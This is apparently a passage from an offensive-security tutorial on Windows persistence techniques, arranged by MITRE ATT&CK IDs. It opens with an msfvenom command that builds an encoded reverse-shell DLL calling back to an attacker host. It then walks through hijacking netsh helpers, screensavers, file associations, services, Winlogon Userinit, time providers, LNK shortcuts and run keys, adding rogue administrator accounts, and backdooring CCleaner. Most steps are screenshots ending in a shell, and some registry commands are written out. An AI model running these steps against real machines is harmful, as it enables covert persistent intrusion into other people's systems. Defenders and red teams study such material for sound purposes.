msfvenom --platform Windows --arch x64 --payload windows/x64/shell_reverse_tcp LHOST=10.0.2.9 LPORT=4444 --encoder x64/xor --iterations 10 --format dll --out payload.dll

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhLdzPhVwvvWhac6Li%2F-MRhMjhmbogz_YQ0YgTQ%2Fimage.png?alt=media&token=9c81f406-7216-4d98-b62b-0b3d12ca3bb6)

Once we send our payload with netsh we will add a helper with netsh add helper  and point it to our dll payload.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhLdzPhVwvvWhac6Li%2F-MRhMfOAR6kNfOA8IRyp%2Fimage.png?alt=media&token=601c22a8-7c06-462e-b69f-6d77376f51e9)

Once our helper is added we immediately get a connection, but we are trying to work as a persistence method so we can close this window and wait until the user uses at any point netsh and we shall receive a reverse shell

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhLdzPhVwvvWhac6Li%2F-MRhMha4DKf0m4kQ43JU%2Fimage.png?alt=media&token=03fe3267-a763-4e33-8750-547af834f7b1)

Shell

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhLdzPhVwvvWhac6Li%2F-MRhMiLTWhR3Fp0lB_Yo%2Fimage.png?alt=media&token=ab819cb2-a9ed-4fe6-a3d9-e4133c138499)

### screensaver

Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr extension. The Windows screensaver application scrnsave.scr is located in C:\Windows\System32\, and C:\Windows\sysWOW64\ on 64-bit Windows systems, along with screensavers included with base Windows installations.

The following screensaver settings are stored in the Registry (HKCU\Control Panel\Desktop\) and could be manipulated to achieve persistence:

·         SCRNSAVE.exe - set to malicious PE path

·         ScreenSaveActive - set to '1' to enable the screensaver

·         ScreenSaverIsSecure - set to '0' to not require a password to unlock

·         ScreenSaveTimeout - sets user inactivity timeout before screensaver is executed

Adversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity.

In this example we will establish persistence with the use of our Screen Saver the current path for the current Screen Saver that is loaded depending on the idle time (1 minute here) will be loaded when the user is inactive during that certain amount of time.

We can see the current value of the Key to what screensaver it is pointing to, if you notice it is using the .scr extension no worries this is just another form of executable so changing the extension name of your payload will work fine as well.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhJ5Q3mm3jD_Hm0yRL%2F-MRhLR094Ep1VHAfG_W2%2Fimage.png?alt=media&token=abf8bab2-0d0c-4004-bd51-f6f4def85810)

We can vie other key values as well:

Screensaver is Active

Screensavers Timeout (usually this is in seconds)

SCRNSAVE.EXE - The binary it is loading when the idle time has been reached

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhJ5Q3mm3jD_Hm0yRL%2F-MRhLSWtOITRHMAQZTm3%2Fimage.png?alt=media&token=139bea1b-798f-48b0-bbde-f5aa8b9f906e)

All that we wish to accomplish in this situation is have the screensaver point to our payload. We do not need Administrator privileges in this matter as any user can setup their own screensaver as they would like.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhJ5Q3mm3jD_Hm0yRL%2F-MRhLUWtyJ0e7KzMa1W8%2Fimage.png?alt=media&token=5cd9c11f-cfae-4c6a-9798-3ae74e6b7cf6)

We wait for the 60 seconds (1 min) to pass an we should receive a shell back to our attacking machine.

**Demo:**

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhJ5Q3mm3jD_Hm0yRL%2F-MRhLWjmrbBfngbPmaJD%2FScreenSaver-Sample.gif?alt=media&token=5e638d29-0cdf-40c5-bdc9-efa5410709d2)

### default-file-association

Adversaries may establish persistence by executing malicious content triggered by a file type association. When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using built-in assoc utility. Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.

System file associations are listed under HKEY_CLASSES_ROOT.[extension], for example HKEY_CLASSES_ROOT.txt. The entries point to a handler for that extension located at HKEY_CLASSES_ROOT[handler]. The various commands are then listed as subkeys underneath the shell key at HKEY_CLASSES_ROOT[handler]\shell[action]\command. For example: HKEY_CLASSES_ROOT\txtfile\shell\open\command HKEY_CLASSES_ROOT\txtfile\shell\print\command* HKEY_CLASSES_ROOT\txtfile\shell\printto\command

The values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands.

Example:

On Windows, extensions that are known by the operating system are defined in the registry. For example we have a txt file.

Below we see the one responsible for opening a text file.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhJ5Q3mm3jD_Hm0yRL%2F-MRhLEFCbpBx44apZbAO%2Fimage.png?alt=media&token=6e42fa70-64e6-4c92-b821-6903838a9439)

Each of these extensions may be connected to some handler, that is also defined in the registry in this case we know .txt are handled by notepad.

In this section the important one we want to know about is the command option:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhJ5Q3mm3jD_Hm0yRL%2F-MRhLEzvzAm6lIMx-m2z%2Fimage.png?alt=media&token=37fe3091-0105-4bdb-aa51-f1361acb9ad3)

We can see that notepad runs with parameters one of them being (%1) is the name of the file that was clicked. Thanks to this notepad opens the clicked file.

We can replace the value to point it to our payload and gain a shell. But we also don't want to mess with the proper functionality of the execution so we will create a small batch script which calls our payload and the proper program to open the extension. This should be the final settings for the hijack.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhJ5Q3mm3jD_Hm0yRL%2F-MRhLFfyu-lKxhwaavZd%2Fimage.png?alt=media&token=f839f10c-c70f-4115-8f02-ae3214329c2c)

Then we open  regular txt file and check our shell connection.

We have to be lucky and the file note have a (" ") space on the name or this will be taking as 2 different files to be opened

Demo:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhJ5Q3mm3jD_Hm0yRL%2F-MRhLKPicBK8Mw7OT450%2FHijackExtension-Sample.gif?alt=media&token=1964ac26-1796-4163-aa27-d2a4da8b4346)

## t1543-create-or-modify-system-process

Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services. On macOS, launchd processes known as Launch Daemon and Launch Agent are run to finish system initialization and load user specific parameters.

Adversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect.

Services, daemons, or agents may be created with administrator privileges but executed under root/SYSTEM privileges. Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges.

### windows-services

Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it start programs or applications called services that perform background system functions. Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in Windows Registry. Service configurations can be modified using utilities such as sc.exe and Reg.

Adversaries may install a new service or modify an existing service by using system utilities to interact with services, by directly modifying the Registry, or by using custom tools to interact with the Windows API. Adversaries may configure services to execute at startup in order to persist on a system.

An adversary may also incorporate Masquerading by using a service name from a related operating system or benign software, or by modifying existing services to make detection analysis more challenging. Modifying existing services may interrupt their functionality or may enable services that are disabled or otherwise not commonly used.

Services may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges from administrator to SYSTEM. Adversaries may also directly start services through Service Execution.

Example::

In this situation I will create a New Service to achieve persistence we can only continue here with Administrator Privileges as mentioned previously we will create a Service with Administrator but these services get executed as SYSTEM.

Here is a sample on what happens when working with user permissions:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhJ5Q3mm3jD_Hm0yRL%2F-MRhKvsdq6ApZNUi9829%2Fimage.png?alt=media&token=d62e4483-77a4-47a1-9338-5b54e1e98363)

Now let's create it with Administrator Privileges the parameters are easy to follow:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhJ5Q3mm3jD_Hm0yRL%2F-MRhKs3zMoY1kl1BKLgT%2Fimage.png?alt=media&token=4864ed1a-ae51-473f-9989-ff90b0b0234e)

Let us check our Service

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhJ5Q3mm3jD_Hm0yRL%2F-MRhKsoTOGlsAVXOKZna%2Fimage.png?alt=media&token=bd61f028-1a96-466e-8481-0563a2d76b74)

Currently stopped now we will start our service and check our shell back with SYSTEM privileges

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhJ5Q3mm3jD_Hm0yRL%2F-MRhKtRXJJs2Og96McIA%2Fimage.png?alt=media&token=9830ce26-82c6-44e1-965f-be7ed2c01322)

Shell:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhJ5Q3mm3jD_Hm0yRL%2F-MRhKyGH2WeWXLJ-kGYl%2Fimage.png?alt=media&token=079bb77f-2900-4042-927b-edb65fd90813)

## t1136-create-account

Adversaries may create an account to maintain access to victim systems. With a sufficient level of access, creating such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system,

Accounts may be created on the local system or within a domain or cloud tenant. In cloud environments, adversaries may create accounts that only have access to specific services which can reduce the chance of detection.

### domain-account

Adversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover user, administrator, and service accounts. With a sufficient level of access, the net user /add /domain command can be used to create a domain account.

Such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.

Example:

A normal command to query domain users with user privileges:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhJ5Q3mm3jD_Hm0yRL%2F-MRhKZtT4Va7RdW9JEeO%2Fimage.png?alt=media&token=fe3463b5-6875-49f9-9344-f0be015808f4)

But can we add a user?:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhJ5Q3mm3jD_Hm0yRL%2F-MRhK_gFdfrQMPfo59pt%2Fimage.png?alt=media&token=d9e03cdf-e241-4bab-81e4-eb0d6d768f8c)

No we need to be Domain Administrators if we gain local Administrator we will only gain a local account user administrator privileges, here we need to make sure we are Domain Admins and we can perfectly create a Domain User

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhJ5Q3mm3jD_Hm0yRL%2F-MRhKaWg2tACkTuHJBo4%2Fimage.png?alt=media&token=5683965c-16c4-4d7b-b92b-d1320263995b)

As we can see we are able to create a user but it needs a minimum of requirements to create a user successfully and once created we can add this user to the Domain Users Group so we can have complete control over the Domain

### local-account

Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administrative on a single system or service. With a sufficient level of access, the net user /add command can be used to create a local account.

Such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.

Example:

Working with accounts is very simple once you have reached the Administrator privileges this is a necessary requirement as we will need Administrator Permissions to create local users or to change account passwords to maintain our permissions.

The net users command is optimal here for our task at hand

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhJ5Q3mm3jD_Hm0yRL%2F-MRhKPrCEH_Wqo-EQFfQ%2Fimage.png?alt=media&token=cbd645ef-4bcc-4681-b6f1-c12e63bb5dab)

Let's create a simple user with Administrator Access:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhJ5Q3mm3jD_Hm0yRL%2F-MRhKQbjgblhev4Upc2S%2Fimage.png?alt=media&token=5f82d784-f012-4a16-a739-f211f66d9673)

Let's check our permissions

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhJ5Q3mm3jD_Hm0yRL%2F-MRhKRJBmuPqpBGS407Y%2Fimage.png?alt=media&token=c7134c45-d045-4843-b364-6a28e50c5932)

Great we can see our user is created and has Administrator Access.

We can achieve the same goal for Domain Users as well but here we will need to reach the Domain Administrator permissions to create a user on a Domain as we currently only created a local account for the current workstation. Command is similar but we will add the "/domain" parameter onto our command to achieve this.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhJ5Q3mm3jD_Hm0yRL%2F-MRhKSCquEZexqOHkHDV%2Fimage.png?alt=media&token=7fe5ca93-d1a6-4a32-9c76-48dcfdfbfd86)

## t1554-compromise-client-software-binary

Adversaries may modify client software binaries to establish persistent access to systems. Client software enables users to access services provided by a server. Common client software types are SSH clients, FTP clients, email clients, and web browsers.

Adversaries may make modifications to client software binaries to carry out malicious tasks when those applications are in use. For example, an adversary may copy source code for the client software, add a backdoor, compile for the target, and replace the legitimate application binary ( or support files) with the backdoored one. Since these applications may be routinely executed by the user, the adversary can leverage this persistent access to the host.

Examples:

On this technique we can see it's a little self-explanatory we grab a legitimate binary from the workstation usually something widely use in the Company or Industry and we Inject our malicious code onto the legitimate binary without compromising it's normal functionality. There is a great tool out there a little bit outdated (as of writing there is a new one being developed for July 2021).

Let us use this tool to create a backdoored compromised binary, in this example I will use the Ccleaner application very well known for tidying up our windows machines for speed or any unnecessary/left over files.

I will focus on the 64bit version as this is what the shortcuts are currently running:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhIt1wCCw4s6xTF4gh%2F-MRhJ1fqqDwdMQOEuCka%2Fimage.png?alt=media&token=0079f212-0844-49b7-aca7-d9b907c45564)

Let us grab this binary and take it to our Attacking machine.

Here is the command-line example used to backdoor the application:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhIt1wCCw4s6xTF4gh%2F-MRhJ2dBvxq2YacAsdgW%2Fimage.png?alt=media&token=04321f6a-96cc-4a58-aabb-1cf0dbb109cf)

Once the tool is executing it will try and locate for free space to inject our shellcode that is available on the binary, if so it will ask us to choose from the variety of options on where to locate the code.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhIt1wCCw4s6xTF4gh%2F-MRhJ3HDSS4kInwRtwr9%2Fimage.png?alt=media&token=525f3c71-7646-434e-9373-dbecb3ab4adb)

 Once it is done, it will locate the newly created backdoored binary into a "backdoored" folder

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhIt1wCCw4s6xTF4gh%2F-MRhJ4648hcWOD9py0Ec%2Fimage.png?alt=media&token=b8dd10e0-ba87-4888-ab59-a9ceeee027bb)

This new binary containing its original functionality will know give us persistence at a user level. We can replace the original with our backdoored one as we will gain a shell but the original execution of the binary will remain the same.

## t1547-boot-or-logon-autostart-execution

Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain a higher-level privileges on compromised systems. Operating systems may have a mechanism for automatically running a program on system boot or account logon. These mechanisms may include automatically executing programs that are place in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. And adversary may achieve the same goal by modifying or extending features of the kernel.

Since some boot or logon AutoStart programs run with higher privileges, an adversary may leverage these elevated privileges.

### shortcut-modification

Adversaries may create or edit shortcuts to run a program during system boot or user login. Shortcuts or symbolic links are ways of referencing other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.

Adversaries could use shortcuts to execute their tools for persistence. They may create a new shortcut as a means of indirection that may use Masquerading to look like a legitimate program. Adversaries could also edit the target path or entirely replace an existing shortcut so their tools will be executed instead of the intended legitimate program.

**Example:**

LNK they are shortcut files that point to a binary or file which can be accessed directly without having to find the location of the file from various directories such as TXT Files.

It's very simple to create and have the shortcut point to our payload or command to execute.

Right Click

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhIbDAwNBAAWiFjGtQ%2F-MRhImc41dUGktjb9teY%2Fimage.png?alt=media&token=1d1f046d-0f0a-4f24-9b63-77a4fa569aec)

We fill in the command to get executed or we point it to our payload that we can use to establish persistence.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhIbDAwNBAAWiFjGtQ%2F-MRhIlu5TUeWwWew4tmS%2Fimage.png?alt=media&token=a22b6a72-f7d5-48a2-ad08-9b6baf7e942d)

And save it

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhIbDAwNBAAWiFjGtQ%2F-MRhInNCfMx2w3NtTYBP%2Fimage.png?alt=media&token=3a834cf9-a64c-4e6b-a41c-62a06fb5e954)

We see that when double clicked it will spawn cmd but will open the calculator applications

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhIbDAwNBAAWiFjGtQ%2F-MRhIo2OFBkcONL7FJVU%2Fimage.png?alt=media&token=0c2fefe6-203d-4032-8003-7ef5a4a0b628)

We can also point to one of our payloads. And we can also change the icon so it doesn't look like your typical binary Icon being executed a little social engineering to trick our user.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhIbDAwNBAAWiFjGtQ%2F-MRhIp1q4iEv1rD0NN7P%2Fimage.png?alt=media&token=5108298a-493b-4b2f-bbeb-70bf317dbdab)

Once double clicked we receive a shell

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhIbDAwNBAAWiFjGtQ%2F-MRhIpzN383hXa7vv87T%2Fimage.png?alt=media&token=6b484f48-3185-48cb-963f-3dc6dbdab277)

This technique will establish persistence at the current user level permissions running it.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhIbDAwNBAAWiFjGtQ%2F-MRhIr-imfOooeBceCpA%2Fimage.png?alt=media&token=98a355a5-3e10-498c-af06-7616aaabf01a)

A great little trick but this will easily be found by our SOC. So just in handy to know that this is available.

Note LNK can also be created with PowerShell in case of no GUI available

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhIbDAwNBAAWiFjGtQ%2F-MRhIrn9InZ1wNQSrAUq%2Fimage.png?alt=media&token=a0360bdc-7f05-4e71-b37c-922dc1b2b6f5)

This technique can also be applied to already existing LNK files such as Google Chrome, Firefox, Edge, etc. As long as these are Shortcut links they can be easily modified as well to have them point to our payload.

**Unfortunately I am not aware on how to change the Icon from PS.**

### winlogon-helper-dll

Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in HKLM\Software{\Wow6432Node\}Microsoft\Windows NT\CurrentVersion\Winlogon and HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon are used to manage additional helper programs and functionalities that support Winlogon.

Malicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse:

·         Winlogon\Notify - points to notification package DLLs that handle Winlogon events

·         Winlogon\Userinit - points to userinit.exe, the user initialization program executed when a user logs on

·         Winlogon\Shell - points to explorer.exe, the system shell executed when a user logs on

Adversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.

Example:

As mentioned this component handles what is going on during logon and logoff times so this payload needs to be dropped onto the System23 folder, in this way we can load the legitimate binary and our payload and the same time.

The registry key that we will focus in this situation is the UserInit. We will need Administrator privileges for this technique to work properly.

Could not load image

Machine generated alternative text:
Administrator: Command Prompt 
Microsoft windows [Version 18.8.19842.638] 
(c) 2828 microsoft Corporation. All rights reserved . 
C: \Windows\system32>reg add NT\CurrentVersion\Win10gon" 'v Userinit 'd "Userinit .exe, payloadx64.exe" If 

We can also apply the same technique to the Shell Registry and we can also reach the same goal when a user logs in we will receive a shell.

From here we can simply lock the screen of the target workstation and wait for the user to log back onto the machine.

Logoff:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhHFLvttKgY6bV3sia%2F-MRhIX9SpTgBCPzG58W7%2Fimage.png?alt=media&token=cd27f2cc-5a68-4479-9b59-f74d878d917b)

Sign-in:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhHFLvttKgY6bV3sia%2F-MRhIXtD3yapNFH7GwJo%2Fimage.png?alt=media&token=f7c809e9-b9e1-40b2-9991-947d0af7999f)

Shel:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhHFLvttKgY6bV3sia%2F-MRhIYu2DEBjEhnmWMdW%2Fimage.png?alt=media&token=e948e901-a47a-4fff-9c5e-4448d72b1297)

We have 2 registry keys that we can modify and reach our goal of persistence but we also have a 3rd one Notify Key:

The “

**Notify**

” registry key is typically found in older operating systems (prior to Windows 7) and it points to a notification package DLL file which handles Winlogon events. Replacing DLL entries under this registry key with an arbitrary DLL will cause Windows to execute it during logon.

As we can see both of our methods will work correctly and will execute on logon we just have to remember that these binary's need to be dropped on the System32 folder so that both the legitimate and the payload gets executed.

References:

​

[https://pentestlab.blog/2020/01/14/persistence-winlogon-helper-dll/](https://pentestlab.blog/2020/01/14/persistence-winlogon-helper-dll/)

### time-providers

Adversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains. W32Time time provides are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients.

Time providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\. The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed.

The Windows Time Service (32Time) synchronizes the date and time for all computers running in Active Directory Domain Services (AD DS). Time synchronization is critical for the proper operation of many Windows services and line-of-business applications. The Windows Time service uses the Network Time Protocol (NTP)  to synchronize computer clocks on the network. NTP ensures that an accurate clock value, or timestamp, can be assigned to network validation and resources access requests.

This approach requires Administrator Privileges as this resides in the System32 folder.

Will add a Registry Key that will call our malicious DLL File

Administrator Cmd:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhHFLvttKgY6bV3sia%2F-MRhILv-8HSh4s5_gn14%2Fimage.png?alt=media&token=9d491b21-0d5c-425e-9ebd-d9e297109cef)

There is an already Registered Key so I will just accept to overwrite the DLLs values.

We can view the Service with the sc.exe command and query the properties.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhHFLvttKgY6bV3sia%2F-MRhILAfemRqHWCjO0Ek%2Fimage.png?alt=media&token=2fdd9a4f-4737-486e-907c-eebfb69dfb77)

We see that it's currently running let us stop it and start the service back up again but this time we will be gaining a reverse shell from this technique.

Our Listener:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhHFLvttKgY6bV3sia%2F-MRhIMuVRY5J2Un9hRyz%2Fimage.png?alt=media&token=76ee7b0c-22d2-455f-84ea-590b2b347f37)

Service stopped and started:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhHFLvttKgY6bV3sia%2F-MRhINfa2LXvwLsIOP1b%2Fimage.png?alt=media&token=2d6915d2-8762-49ac-a13f-fbc65fe6b7a7)

Shell:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhHFLvttKgY6bV3sia%2F-MRhIOURprXUYGtH84aq%2Fimage.png?alt=media&token=52d927b3-d5e1-4d9b-9f19-960a8fe61837)

References:

​

[https://pentestlab.blog/2019/10/22/persistence-time-providers/](https://pentestlab.blog/2019/10/22/persistence-time-providers/)

https://pentestlab.blog/2019/10/22/persistence-time-providers/

https://docs.microsoft.com/en-us/windows-server/networking/windows-time-service/windows-time-service-top

[https://docs.microsoft.com/en-us/windows-server/networking/windows-time-service/windows-time-service-top](https://pentestlab.blog/2019/10/22/persistence-time-providers/)

### registry-run-keys-startup-folder

Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the "run keys" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. These programs will be executed under the context of the user and will have the account's associated permissions level.

Placing a program within a startup folder will also cause the program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is: C:\Users[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup. The startup folder path for all users is: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp.

The following run keys are created by default on Windows systems:

·         HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run

·         HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce

·         HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run

·         HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce

Run keys may exist under multiple hives. The

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. For example, it is possible to load a DLL at logon using a "Depend" key with RunOnceEx: reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\temp\evil[.]dll"

The following Registry keys can control automatic startup of services during boot:

·         HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce

·         HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce

·         HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices

·         HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices

Using policy settings to specify startup programs creates corresponding values in either of two Registry keys:

·         HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run

·         HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run

The Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit and

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell subkeys can automatically launch programs.

Programs listed in the load value of the registry key

HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows run when any user logs on.

Be default, the multistring BootExecute value of the registry key

HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager is set to autocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.

Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.

**StartUp Folder:**

The startup folder as the name implies a folder containing programs that will initiate at Boot Time once a user has logged onto their session, we can apply this method to a single User or to All Users depending on the level of permissions we currently hold, in the following example I will just setup a simple BAT file on the startup folder for my current user and login back to the machine and have that file get executed once the user has logged on to the workstation.

Bat File

